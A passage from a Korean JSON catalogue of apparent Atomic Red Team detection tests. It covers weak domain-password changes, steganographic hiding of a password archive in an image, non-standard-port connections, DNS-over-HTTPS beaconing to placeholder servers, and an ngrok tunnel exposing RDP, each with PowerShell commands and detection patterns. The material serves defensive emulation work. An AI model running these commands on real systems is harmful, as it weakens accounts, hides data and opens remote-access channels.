        "ConvertTo-SecureString 'lower-long-special-333' -AsPlainText -Force 로 새 비밀번호를 만든다.",
        "Set-ADAccountPassword를 호출해 비밀번호를 변경하고, 오류 발생 시 ErrorCode를 출력한다.",
        "성공 시 cred_file을 새 비밀번호로 갱신한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "$credFile = \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\"; if (Test-Path $credFile) { $cred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)); $newPassword = ConvertTo-SecureString 'lower-long-special-333' -AsPlainText -Force; Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.Password -NewPassword $newPassword }"
        }
      ],
      "prerequisites": [
        "cred_file에 현재 계정 비밀번호가 올바르게 저장되어 있어야 한다.",
        "테스트 계정은 도메인 계정이어야 하고, 스스로의 비밀번호를 바꿀 수 있어야 한다.",
        "도메인 컨트롤러와 통신 가능한 환경에서 ActiveDirectory 모듈이 동작해야 한다."
      ],
      "artifacts": {
        "files_created": [
          {
            "path": "$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt",
            "description": "현재 사용자 비밀번호를 SecureString으로 저장하는 cred_file"
          }
        ],
        "files_read": [
          {
            "path": "$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt",
            "description": "OldPassword 확보를 위해 읽는 cred_file"
          }
        ],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "대문자가 없는 비밀번호로 도메인 계정 비밀번호 변경을 시도한 PowerShell 세션",
            "commandline_pattern": "Set-ADAccountPassword -Identity * -NewPassword (ConvertTo-SecureString lower-long-special-333 -AsPlainText -Force)"
          }
        ],
        "network": []
      },
      "cleanup": [
        "테스트용으로 설정된 비밀번호를 보안 정책에 맞는 복잡한 비밀번호로 재설정한다.",
        "cred_file 파일의 접근 권한과 보관 필요성을 재검토하고, 필요 없으면 삭제한다.",
        "비밀번호 정책(대문자 요구사항 등)을 재검토하고, 그룹 정책·FGPP가 실제로 적용되는지 확인한다."
      ],
      "metadata": {
        "atomic_source_id": "b299c120-44a7-4d68-b8e2-8ba5a28511ec"
      }
    },
    {
      "test_id": "T1098-8",
      "name": "Domain Password Policy Check: No Lowercase Character in Password",
      "platforms": ["windows"],
      "summary": "이 테스트는 모든 알파벳이 대문자이고 숫자·특수문자만 섞인 비밀번호(UPPER-LONG-SPECIAL-333)를 새 비밀번호로 설정해, 소문자 사용이 정책상 필수인지 확인한다. 소문자를 요구하지 않는 환경에서는 PASSWORD2025! 같은 단순 패턴의 대문자 비밀번호가 널리 사용될 수 있다. 스크립트는 cred_file에서 기존 비밀번호를 읽어와 Set-ADAccountPassword를 호출하고, 성공 시 cred_file을 새 비밀번호로 갱신한다.",
      "procedure": [
        "cred_file에서 현재 계정 비밀번호를 읽어 PSCredential 객체를 생성한다.",
        "새 비밀번호(UPPER-LONG-SPECIAL-333)가 cred_file 값과 동일한지 검사한다.",
        "ConvertTo-SecureString 'UPPER-LONG-SPECIAL-333' -AsPlainText -Force 로 새 비밀번호 SecureString을 만든다.",
        "Set-ADAccountPassword로 비밀번호를 변경하고, 실패 시 예외와 ErrorCode를 출력한다.",
        "성공 시 cred_file을 새 비밀번호로 덮어쓴다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "$credFile = \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\"; if (Test-Path $credFile) { $cred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)); $newPassword = ConvertTo-SecureString 'UPPER-LONG-SPECIAL-333' -AsPlainText -Force; Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.Password -NewPassword $newPassword }"
        }
      ],
      "prerequisites": [
        "cred_file이 존재하고, 그 안의 SecureString 비밀번호가 실제 계정 비밀번호와 일치해야 한다.",
        "테스트 계정이 도메인 계정이며 도메인 컨트롤러와 연결 가능한 상태여야 한다.",
        "ActiveDirectory 모듈이 설치돼 있어야 한다."
      ],
      "artifacts": {
        "files_created": [
          {
            "path": "$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt",
            "description": "테스트 전후 비밀번호를 보관하는 cred_file"
          }
        ],
        "files_read": [
          {
            "path": "$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt",
            "description": "기존 비밀번호를 OldPassword로 사용하기 위해 읽는 파일"
          }
        ],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "소문자가 없는 대문자+숫자+특수문자 비밀번호로 변경을 시도하는 PowerShell 세션",
            "commandline_pattern": "Set-ADAccountPassword -Identity * -NewPassword (ConvertTo-SecureString UPPER-LONG-SPECIAL-333 -AsPlainText -Force)"
          }
        ],
        "network": []
      },
      "cleanup": [
        "정책에 부합하는 강력한 비밀번호로 계정 비밀번호를 다시 변경한다.",
        "cred_file 파일의 접근 권한과 보관 필요성을 재검토하고, 필요 없으면 삭제한다.",
        "테스트 결과를 기반으로 비밀번호 정책의 최소 문자 클래스 요구사항을 점검한다."
      ],
      "metadata": {
        "atomic_source_id": "945da11e-977e-4dab-85d2-f394d03c5887"
      }
    },
    {
      "test_id": "T1098-9",
      "name": "Domain Password Policy Check: Only Two Character Classes",
      "platforms": ["windows"],
      "summary": "이 테스트는 대문자·소문자 두 가지 문자 클래스만 포함된 비밀번호(onlyUPandLowChars)를 사용해 비밀번호 변경을 시도하며, 패스워드 정책이 최소 문자 클래스 개수(예: 3종 이상)를 실제로 강제하는지 확인한다. 정책 설정은 강하게 되어 있어도 도메인 기능 레벨이나 적용 오류로 인해 2종만으로도 변경이 허용될 수 있다. 성공 시 cred_file을 새 비밀번호로 갱신해 이후 테스트에서도 일관되게 사용할 수 있게 한다.",
      "procedure": [
        "cred_file에서 현재 사용자 비밀번호를 읽어 PSCredential 객체를 생성한다.",
        "새 비밀번호(onlyUPandLowChars)가 cred_file 값과 동일한지 체크해 동일하면 테스트를 중단한다.",
        "ConvertTo-SecureString 'onlyUPandLowChars' -AsPlainText -Force 로 새 비밀번호를 준비한다.",
        "Set-ADAccountPassword로 비밀번호 변경을 시도하고, 실패 시 예외 및 ErrorCode를 출력한다.",
        "성공 시 cred_file에 새 비밀번호를 저장한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "$credFile = \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\"; if (Test-Path $credFile) { $cred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)); $newPassword = ConvertTo-SecureString 'onlyUPandLowChars' -AsPlainText -Force; Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.Password -NewPassword $newPassword }"
        }
      ],
      "prerequisites": [
        "비밀번호가 사전에 cred_file에 저장되어 있어야 하며, 값이 최신 상태여야 한다.",
        "테스트 계정은 도메인 계정이고, 비밀번호 변경이 허용되어야 한다.",
        "ActiveDirectory 모듈 및 도메인 컨트롤러 연결이 가능해야 한다."
      ],
      "artifacts": {
        "files_created": [
          {
            "path": "$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt",
            "description": "현재 사용자 비밀번호를 SecureString으로 저장하는 cred_file"
          }
        ],
        "files_read": [
          {
            "path": "$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt",
            "description": "비밀번호 변경 전후로 참조하는 cred_file"
          }
        ],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "문자 클래스 2종(대소문자)만 포함된 비밀번호로 도메인 패스워드 정책을 점검하는 PowerShell 세션",
            "commandline_pattern": "Set-ADAccountPassword -Identity * -NewPassword (ConvertTo-SecureString onlyUPandLowChars -AsPlainText -Force)"
          }
        ],
        "network": []
      },
      "cleanup": [
        "테스트 비밀번호를 강력한 비밀번호로 교체하고, cred_file 내용도 동시에 갱신한다.",
        "해당 테스트로 인해 계정 잠금이나 추가 경고가 발생했는지 보안 로그를 확인한다.",
        "최소 문자 클래스 개수와 관련된 GPO/FGPP 설정을 검토해 실제 동작과 일치하는지 확인한다."
      ],
      "metadata": {
        "atomic_source_id": "784d1349-5a26-4d20-af5e-d6af53bae460"
      }
    },
    {
      "test_id": "T1098-10",
      "name": "Domain Password Policy Check: Common Password Use",
      "platforms": ["windows"],
      "summary": "이 테스트는 Spring$((Get-Date).Year)! 형식의 시즌+연도+특수문자 조합 비밀번호를 설정하려고 시도해, 조직이 흔히 사용되는 패턴 기반 비밀번호를 차단하는지 확인한다. 이런 패턴은 크리덴셜 스터핑과 사전 공격에서 가장 먼저 시도되는 조합이다. 스크립트는 cred_file에 저장된 값과 새 비밀번호가 동일한지 확인한 뒤 Set-ADAccountPassword를 호출하고, 성공 시 cred_file을 새 비밀번호로 갱신한다.",
      "procedure": [
        "cred_file에서 현재 사용자 비밀번호를 읽어 PSCredential 객체를 생성한다.",
        "PowerShell에서 Spring$((Get-Date).Year)! 표현식으로 시즌+연도 조합의 새 비밀번호 문자열을 만든다.",
        "새 비밀번호가 cred_file 값과 동일한지 비교해 동일하면 테스트를 중단한다.",
        "ConvertTo-SecureString <새 비밀번호> -AsPlainText -Force 로 SecureString을 생성한다.",
        "Set-ADAccountPassword로 비밀번호 변경을 시도하고, 성공 시 cred_file을 새 값으로 덮어쓴다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "$credFile = \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\"; if (Test-Path $credFile) { $cred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)); $new = \"Spring$((Get-Date).Year)!\"; $newPassword = ConvertTo-SecureString $new -AsPlainText -Force; Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.Password -NewPassword $newPassword }"
        }
      ],
      "prerequisites": [
        "cred_file에 현재 계정 비밀번호가 저장되어 있어야 한다.",
        "테스트 계정은 도메인 계정이며, 스스로의 비밀번호를 변경할 수 있어야 한다.",
        "ActiveDirectory 모듈 및 도메인 컨트롤러와의 통신이 가능해야 한다."
      ],
      "artifacts": {
        "files_created": [
          {
            "path": "$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt",
            "description": "현재 사용자 비밀번호를 보관하는 cred_file (테스트 전후 비밀번호 포함 가능)"
          }
        ],
        "files_read": [
          {
            "path": "$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt",
            "description": "OldPassword 확보 및 새 비밀번호와의 비교를 위해 읽는 파일"
          }
        ],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "Spring<Year>! 패턴의 흔한 비밀번호 사용 가능 여부를 점검하는 PowerShell 세션",
            "commandline_pattern": "Set-ADAccountPassword -Identity * -NewPassword (ConvertTo-SecureString \"Spring$((Get-Date).Year)!\" -AsPlainText -Force)"
          }
        ],
        "network": []
      },
      "cleanup": [
        "단순 패턴(Spring<Year>!)으로 설정된 비밀번호를 즉시 강력한 비밀번호로 교체한다.",
        "cred_file을 정리하거나 암호화 저장소로 대체해 민감 정보 노출을 최소화한다.",
        "조직 차원에서 시즌+연도, 회사명+123 등 자주 쓰이는 패턴을 금지 목록으로 정의하고 필터에 반영한다."
      ],
      "metadata": {
        "atomic_source_id": "81959d03-c51f-49a1-bb24-23f1ec885578"
      }
    }
  ]
},
{
  "technique_id": "T1001.002",
  "technique_name": "Data Obfuscation via Steganography",
  "tactic": "Exfiltration",

  "description": "이 ATT&CK 기법이 무엇을 의미하는지,\n공격자가 어떤 목적(지속성, 유출, 권한 상승 등)으로 사용하는지,\n대표적인 방법이 무엇인지 짧게 요약.",

  "tests": [
    {
      "test_id": "T1001.002-1",
      "name": "Steganographic Tarball Embedding",
      "platforms": ["windows"],

      "summary": "이미지 파일과 tar 아카이브를 사용해 데이터를 은닉하는 스테가노그래피 기반 데이터 유출 시나리오를 시뮬레이션한다. 랜덤 패스워드를 생성해 tar 파일에 저장한 뒤, 이미지 바이트와 이어붙여 새로운 이미지 파일을 만든다.",

      "procedure": [
        "이미지 파일 존재 여부를 확인하거나 원격에서 다운로드한다.",
        "랜덤 패스워드를 여러 개 생성해 텍스트 파일로 저장한다.",
        "패스워드 파일을 포함하는 tar 아카이브를 생성한다.",
        "원본 이미지와 tar 파일을 바이트 단위로 이어붙여 새로운 이미지를 만든다."
      ],

      "commands": [
        {
          "executor": "powershell",
          "elevation_required": true,
          "command": "Get-Content <image_file>, <tar_file> -Encoding byte -ReadCount 0 | Set-Content <new_image_file> -Encoding byte"
        }
      ],

      "prerequisites": [
        "지정된 경로에 사용할 이미지 파일이 존재해야 한다 (없으면 원격에서 다운로드).",
        "랜덤 패스워드를 생성해 <passwords_file>에 저장해야 한다.",
        "<passwords_file>을 포함하는 tar 아카이브(<tar_file>)가 생성되어 있어야 한다."
      ],

      "artifacts": {
        "files_created": [
          {
            "path": "%TEMP%\\random_passwords.txt",
            "description": "랜덤 패스워드를 여러 개 저장한 텍스트 파일"
          },
          {
            "path": "%PUBLIC%\\Downloads\\T1001.002.tarz",
            "description": "패스워드 텍스트를 포함하는 tar 아카이브"
          },
          {
            "path": "%PUBLIC%\\Downloads\\T1001.002New.jpg",
            "description": "데이터가 은닉된 새 이미지 파일"
          }
        ],
        "files_read": [
          {
            "path": "PathToAtomicsFolder\\T1001.002\\bin\\T1001.002.jpg",
            "description": "기본 이미지 파일"
          }
        ],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "테스트 실행에 사용된 PowerShell 프로세스",
            "commandline_pattern": "Get-Content * -Encoding byte -ReadCount 0 | Set-Content *"
          }
        ],
        "network": []
      },

      "cleanup": [
        "생성된 새 이미지 파일(<new_image_file>)을 삭제할 수 있다.",
        "테스트용 tar 및 패스워드 파일을 삭제해 흔적을 줄일 수 있다."
      ],

      "metadata": {
        "atomic_source_id": "c7921449-8b62-4c4d-8a83-d9281ac0190b"
      }
    }
  ]
},{
  "technique_id": "T1571",
  "technique_name": "Non-Standard Port",
  "tactic": "Command and Control",

  "description": "비표준 포트 사용 기법은 HTTP(80), HTTPS(443) 등 일반 서비스 포트가 아닌 포트를 통해 C2 통신이나 데이터 유출을 수행하는 것을 의미한다. 공격자는 방화벽 정책이나 모니터링 우회를 위해 잘 사용되지 않는 포트를 선택해 트래픽을 숨기거나 정상 서비스로 위장한다. 이 기법은 주로 원격 제어, 비인가 서비스 운영, 은닉된 터널링에 활용된다.",

  "tests": [
    {
      "test_id": "T1571-1",
      "name": "Testing usage of uncommonly used port with PowerShell",
      "platforms": ["windows"],

      "summary": "PowerShell의 Test-NetConnection cmdlet을 활용해 잘 사용되지 않는 포트에 대한 네트워크 연결을 시도하는 시나리오이다. 공격자가 8081과 같은 비표준 포트로 텔넷/C2 통신을 시도하는 행위를 모사한다. 실행 결과로 대상 호스트와 포트에 대한 연결 성공 여부 및 네트워크 세부 정보가 출력된다.",

      "procedure": [
        "대상 호스트 도메인(<domain>)과 사용할 비표준 포트 번호(<port>)를 결정한다.",
        "PowerShell을 실행한다.",
        "Test-NetConnection -ComputerName <domain> -Port <port> 명령을 실행한다.",
        "명령 실행 결과로 출력되는 TCP 테스트 결과, 응답 여부, 라운드 트립 시간 등을 확인한다."
      ],

      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "Test-NetConnection -ComputerName <domain> -Port <port>"
        }
      ],

      "prerequisites": [
        "테스트를 수행할 Windows 환경에 PowerShell이 설치되어 있어야 한다.",
        "대상 도메인(<domain>)이 DNS로 해석 가능해야 하며, 네트워크적으로 도달 가능한 상태여야 한다.",
        "지정한 비표준 포트(<port>)가 방화벽에 의해 완전히 차단되어 있지 않은 환경에서 테스트하는 것이 바람직하다."
      ],

      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "비표준 포트에 대한 네트워크 연결 테스트를 수행하는 PowerShell 프로세스",
            "commandline_pattern": "Test-NetConnection -ComputerName * -Port *"
          }
        ],
        "network": [
          {
            "remote_address": "<domain>",
            "port": "<port>",
            "protocol": "TCP",
            "description": "PowerShell Test-NetConnection을 통해 비표준 포트로 시도된 아웃바운드 연결"
          }
        ]
      },

      "cleanup": [
        "이 테스트는 디스크 아티팩트를 생성하지 않으므로 별도의 정리 작업은 필요하지 않다.",
        "PowerShell 세션을 종료해 프로세스를 정리할 수 있다."
      ],

      "metadata": {
        "atomic_source_id": "21fe622f-8e53-4b31-ba83-6d333c2583f4"
      }
    }
  ]
},
{
  "technique_id": "T1572",
  "technique_name": "Protocol Tunneling",
  "tactic": "Command and Control",

  "description": "프로토콜 터널링은 한 프로토콜을 다른 프로토콜 내부에 캡슐화해 우회 통신을 수행하는 기법이다. 공격자는 DNS, HTTPS, 개발 터널링 도구 등을 활용해 C2 채널이나 데이터 유출 채널을 정상 트래픽처럼 위장한다. 이 기법은 방화벽, 프록시, IDS/IPS 등의 정책을 우회하거나, 모니터링에 잘 포착되지 않는 은닉 통신 경로를 확보하는 데 활용된다.",

  "tests": [
    {
      "test_id": "T1572-1",
      "name": "DNS over HTTPS Large Query Volume",
      "platforms": ["windows"],

      "summary": "감염된 호스트가 DNS over HTTPS(DoH)를 이용해 대량의 DNS 쿼리를 전송하는 상황을 시뮬레이션한다. 단일 호스트에서 특정 도메인으로 매우 많은 DoH 요청을 보내 임계치 기반 탐지를 트리거하는 것을 목표로 한다. 각 요청에 대해 도메인에 대한 DNS 정보가 JSON 형식으로 반환된다.",

      "procedure": [
        "시뮬레이션에 사용할 DoH 서버 URL(<doh_server>), 기본 도메인(<domain>), 서브도메인(<subdomain>), 쿼리 타입(<query_type>), 전송할 쿼리 수(<query_volume>)를 결정한다.",
        "PowerShell 콘솔을 연다.",
        "for($i=0; $i -le <query_volume>; $i++) 루프를 사용해 Invoke-WebRequest로 DoH 서버에 반복적으로 요청을 전송한다.",
        "각 요청에 대해 반환되는 DNS 응답(JSON)을 확인하고, 네트워크 모니터링 시스템에서 비정상적인 DoH 트래픽 패턴이 탐지되는지 관찰한다."
      ],

      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "for($i=0; $i -le <query_volume>; $i++) { (Invoke-WebRequest \"<doh_server>?name=<subdomain>.$(Get-Random -Minimum 1 -Maximum 999999).<domain>&type=<query_type>\" -UseBasicParsing).Content }"
        }
      ],

      "prerequisites": [
        "테스트를 수행할 Windows 호스트에 PowerShell이 설치되어 있어야 한다.",
        "지정한 DoH 서버(<doh_server>)로의 HTTPS 통신이 네트워크/프록시/방화벽에서 허용되어야 한다.",
        "시뮬레이션에 사용할 도메인(<domain>)이 DNS 상에서 유효하며, 실험 환경의 정책에 위배되지 않는 도메인이어야 한다.",
        "대량의 DoH 요청이 보안 모니터링 시스템(예: DNS 로그 수집, 프록시 로그)에 기록되는 환경에서 수행하는 것이 탐지 테스트에 유리하다."
      ],

      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "대량의 DNS over HTTPS 요청을 보내는 PowerShell 프로세스",
            "commandline_pattern": "for($i=0; $i -le *; $i++) { (Invoke-WebRequest * -UseBasicParsing).Content }"
          }
        ],
        "network": [
          {
            "remote_address": "<doh_server>",
            "port": "443",
            "protocol": "HTTPS",
            "description": "랜덤 서브도메인을 포함한 TXT 쿼리를 대량으로 전송하는 DNS over HTTPS 트래픽"
          }
        ]
      },

      "cleanup": [
        "이 테스트는 기본적으로 디스크에 파일을 생성하지 않으므로 별도의 클린업 작업이 필요하지 않다.",
        "테스트 종료 후 PowerShell 세션을 종료해 관련 프로세스를 정리한다."
      ],

      "metadata": {
        "atomic_source_id": "ae9ef4b0-d8c1-49d4-8758-06206f19af0a"
      }
    },
    {
      "test_id": "T1572-2",
      "name": "DNS over HTTPS Regular Beaconing",
      "platforms": ["windows"],

      "summary": "감염된 호스트가 DNS over HTTPS를 통해 주기적으로 C2 서버에 비콘을 보내는 행위를 시뮬레이션한다. 일정 시간(runtime) 동안, 기본 인터벌(c2_interval)과 지터(c2_jitter)를 적용해 변동 간격으로 DoH 쿼리를 전송한다. 이는 저빈도·장기적인 C2 통신 패턴을 탐지하는 데 유용하다.",

      "procedure": [
        "PathToAtomicsFolder로 지정된 경로 아래에 T1572\\src\\T1572-doh-beacon.ps1 스크립트가 존재하는지 확인한다.",
        "PowerShell을 실행한 뒤 Set-Location \"PathToAtomicsFolder\"를 통해 Atomic Red Team 루트 경로로 이동한다.",
        "T1572-doh-beacon.ps1 스크립트를 DoH 서버(<doh_server>), 도메인(<domain>), 서브도메인(<subdomain>), 쿼리 타입(<query_type>), C2 인터벌(<c2_interval>), 지터(<c2_jitter>), 실행 시간(<runtime>) 파라미터와 함께 실행한다.",
        "지정된 시간 동안 주기적으로 발생하는 DoH 비콘 트래픽과 각 호출에 대한 DNS 응답(JSON)을 모니터링한다."
      ],

      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "Set-Location \"PathToAtomicsFolder\"\n.\\T1572\\src\\T1572-doh-beacon.ps1 -DohServer <doh_server> -Domain <domain> -Subdomain <subdomain> -QueryType <query_type> -C2Interval <c2_interval> -C2Jitter <c2_jitter> -RunTime <runtime>"
        }
      ],

      "prerequisites": [
        "PathToAtomicsFolder\\T1572\\src\\T1572-doh-beacon.ps1 파일이 존재해야 한다.",
        "PowerShell 스크립트 실행 정책이 해당 스크립트 실행을 허용하도록 설정되어 있어야 한다(예: ExecutionPolicy 우회 또는 적절한 정책 설정).",
        "DoH 서버(<doh_server>)와의 HTTPS 통신이 허용되어야 한다.",
        "지정한 런타임(<runtime>) 동안 테스트를 유지할 수 있는 환경(랩/테스트 네트워크)에서 실행하는 것이 권장된다."
      ],

      "artifacts": {
        "files_created": [],
        "files_read": [
          {
            "path": "PathToAtomicsFolder\\T1572\\src\\T1572-doh-beacon.ps1",
            "description": "주기적인 DoH 비콘 트래픽을 생성하는 PowerShell 스크립트"
          }
        ],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "T1572-doh-beacon.ps1 스크립트를 실행해 DNS over HTTPS 비콘을 전송하는 프로세스",
            "commandline_pattern": "*T1572-doh-beacon.ps1 -DohServer * -Domain * -Subdomain * -QueryType * -C2Interval * -C2Jitter * -RunTime *"
          }
        ],
        "network": [
          {
            "remote_address": "<doh_server>",
            "port": "443",
            "protocol": "HTTPS",
            "description": "C2Interval와 C2Jitter가 반영된 간격으로 발생하는 DNS over HTTPS 비콘 트래픽"
          }
        ]
      },

      "cleanup": [
        "테스트 종료 후 PowerShell 세션을 종료해 스크립트 실행을 중단한다.",
        "필요 시 DoH 비콘 탐지 실험에 사용한 로그(프록시 로그, DNS 로그 등)를 별도 보관하거나 삭제 정책에 따라 정리한다."
      ],

      "metadata": {
        "atomic_source_id": "0c5f9705-c575-42a6-9609-cbbff4b2fc9b"
      }
    },
    {
      "test_id": "T1572-3",
      "name": "DNS over HTTPS Long Domain Query",
      "platforms": ["windows"],

      "summary": "긴 도메인 이름을 사용해 DNS over HTTPS 쿼리를 전송하는 시나리오를 시뮬레이션한다. 서브도메인을 최대 길이(63바이트)에 가깝게 설정하고, 이를 포함한 도메인으로 DoH 요청을 보내 데이터 반환/유출 패턴을 모사한다. 긴 도메인 이름 기반 DoH 트래픽에 대한 탐지 임계값과 룰을 검증하는 데 활용된다.",

      "procedure": [
        "PathToAtomicsFolder\\T1572\\src\\T1572-doh-domain-length.ps1 스크립트가 존재하는지 확인한다.",
        "실험에 사용할 DoH 서버(<doh_server>), 기본 도메인(<domain>), 63자 길이에 가까운 서브도메인(<subdomain>), 쿼리 타입(<query_type>)을 설정한다.",
        "PowerShell에서 Set-Location \"PathToAtomicsFolder\" 명령으로 Atomic Red Team 루트 경로로 이동한다.",
        "T1572-doh-domain-length.ps1 스크립트를 위 파라미터와 함께 실행해 점점 길어지는 도메인 이름을 포함한 DoH 쿼리를 전송한다.",
        "네트워크 모니터링 도구에서 도메인 길이가 비정상적으로 긴 DoH 요청이 탐지되는지 확인한다."
      ],

      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "Set-Location \"PathToAtomicsFolder\"\n.\\T1572\\src\\T1572-doh-domain-length.ps1 -DohServer <doh_server> -Domain <domain> -Subdomain <subdomain> -QueryType <query_type>"
        }
      ],

      "prerequisites": [
        "PathToAtomicsFolder\\T1572\\src\\T1572-doh-domain-length.ps1 파일이 존재해야 한다.",
        "PowerShell 스크립트 실행 정책이 해당 스크립트 실행을 허용하도록 설정되어 있어야 한다.",
        "DoH 서버(<doh_server>)와의 통신이 네트워크 상에서 허용되어야 한다.",
        "긴 도메인 이름 기반 트래픽을 모니터링·분석할 수 있는 DNS/프록시/보안 로그 환경이 갖추어져 있으면 좋다."
      ],

      "artifacts": {
        "files_created": [],
        "files_read": [
          {
            "path": "PathToAtomicsFolder\\T1572\\src\\T1572-doh-domain-length.ps1",
            "description": "긴 도메인 이름을 포함한 DNS over HTTPS 쿼리를 생성하는 PowerShell 스크립트"
          }
        ],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "T1572-doh-domain-length.ps1 스크립트를 실행해 긴 도메인 기반 DoH 트래픽을 생성하는 프로세스",
            "commandline_pattern": "*T1572-doh-domain-length.ps1 -DohServer * -Domain * -Subdomain * -QueryType *"
          }
        ],
        "network": [
          {
            "remote_address": "<doh_server>",
            "port": "443",
            "protocol": "HTTPS",
            "description": "도메인 길이를 점진적으로 증가시키며 전송되는 DNS over HTTPS 쿼리 트래픽"
          }
        ]
      },

      "cleanup": [
        "실험 종료 후 PowerShell 세션을 종료한다.",
        "테스트에 사용된 로그를 보존 또는 삭제 정책에 따라 정리한다."
      ],

      "metadata": {
        "atomic_source_id": "748a73d5-cea4-4f34-84d8-839da5baa99c"
      }
    },
    {
      "test_id": "T1572-4",
      "name": "Run ngrok Tunnel",
      "platforms": ["windows"],

      "summary": "ngrok을 다운로드 및 실행하여 로컬 포트(기본값 3389, RDP)에 대한 TCP 터널을 인터넷으로 노출하는 시나리오를 시뮬레이션한다. 공격자는 이를 통해 방화벽·NAT 뒤에 있는 내부 시스템에 원격으로 접근할 수 있는 C2/원격 제어 채널을 구성할 수 있다.",

      "procedure": [
        "테스트에 사용할 ngrok API 토큰(<api_token>), 터널로 노출할 로컬 포트 번호(<port_num>), ngrok 다운로드 URL(<download>)을 준비한다.",
        "사전 조건을 실행해 C:\\Users\\Public\\ngrok 디렉터리가 존재하고, 해당 위치에 ngrok 실행 파일이 다운로드·압축 해제되어 있는지 확인한다(없으면 Invoke-WebRequest와 Expand-Archive로 자동 준비).",
        "PowerShell에서 C:\\Users\\Public\\ngrok\\ngrok.exe config add-authtoken <api_token> 명령을 통해 인증 토큰을 설정한다.",
        "Start-Job을 사용해 ngrok.exe tcp <port_num> 명령을 백그라운드 잡으로 실행하여 TCP 터널을 생성한다.",
        "잠시 대기한 후(Start-Sleep), 필요 시 Start-Job으로 생성된 잡을 중지하고 테스트를 종료한다."
      ],

      "commands": [
        {
          "executor": "powershell",
          "elevation_required": true,
          "command": "C:\\Users\\Public\\ngrok\\ngrok.exe config add-authtoken <api_token> | Out-Null\nStart-Job -ScriptBlock { C:\\Users\\Public\\ngrok\\ngrok.exe tcp <port_num> } | Out-Null\nStart-Sleep -s 5\nStop-Job -Name Job1 | Out-Null"
        }
      ],

      "prerequisites": [
        "테스트에 사용할 유효한 ngrok API 토큰(<api_token>)을 보유하고 있어야 한다.",
        "사전 준비 단계에서 C:\\Users\\Public\\ngrok 경로에 ngrok ZIP 파일을 다운로드하고, Expand-Archive로 압축을 해제해야 한다.",
        "ngrok이 통신할 수 있도록 외부 인터넷 접속이 허용되어야 하며, ngrok 서비스 도메인(예: *.ngrok.io)으로의 접속이 차단되지 않아야 한다.",
        "노출할 로컬 포트(<port_num>)에 실제로 서비스(RDP 등)가 동작 중이어야 터널을 통해 접속이 가능하다."
      ],

      "artifacts": {
        "files_created": [
          {
            "path": "C:\\Users\\Public\\ngrok",
            "description": "ngrok 실행 파일과 관련 아티팩트를 저장하는 디렉터리"
          },
          {
            "path": "C:\\Users\\Public\\ngrok\\ngrok-v3-stable-windows-amd64.zip",
            "description": "ngrok 배포 ZIP 파일 (사전 준비 단계에서 다운로드)"
          },
          {
            "path": "C:\\Users\\Public\\ngrok\\ngrok.exe",
            "description": "터널 생성에 사용되는 ngrok 실행 파일"
          },
          {
            "path": "%USERPROFILE%\\AppData\\Local\\ngrok",
            "description": "ngrok 설정 및 상태 정보를 저장하는 로컬 설정 디렉터리(존재할 경우)"
          }
        ],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "ngrok.exe",
            "description": "로컬 포트를 외부로 터널링하는 ngrok 프로세스",
            "commandline_pattern": "ngrok.exe tcp *"
          },
          {
            "name": "powershell.exe",
            "description": "ngrok 다운로드, 설정 및 Start-Job을 수행하는 PowerShell 프로세스",
            "commandline_pattern": "C:\\Users\\Public\\ngrok\\ngrok.exe config add-authtoken *"
          }
        ],
        "network": [
          {
            "remote_address": "<ngrok_service>",
            "port": "443",
            "protocol": "HTTPS",
            "description": "ngrok 제어 채널 및 터널 관리 트래픽"
          },
          {
            "remote_address": "<assigned_tunnel_endpoint>",
            "port": "<random_high_port>",
            "protocol": "TCP",
            "description": "외부에서 ngrok 터널 엔드포인트를 통해 내부 포트(<port_num>)로 라우팅되는 연결"
          }
        ]
      },

      "cleanup": [
